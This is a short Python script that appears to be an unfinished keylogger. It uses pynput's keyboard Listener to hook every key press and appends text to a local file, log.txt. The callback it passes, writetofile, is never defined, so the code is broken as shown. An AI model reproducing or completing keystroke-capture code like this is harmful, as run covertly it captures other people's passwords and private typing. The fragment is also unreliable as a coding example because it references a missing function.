# f = open ("log.txt",'a')
# f.write ("\n i am id \n")
# f.close()
from pynput.keyboard import Listener

with open("log.txt",'a') as f:
    f.write ("\n i am god \n")

with Listener (on_press=writetofile) as l:
    l.join()   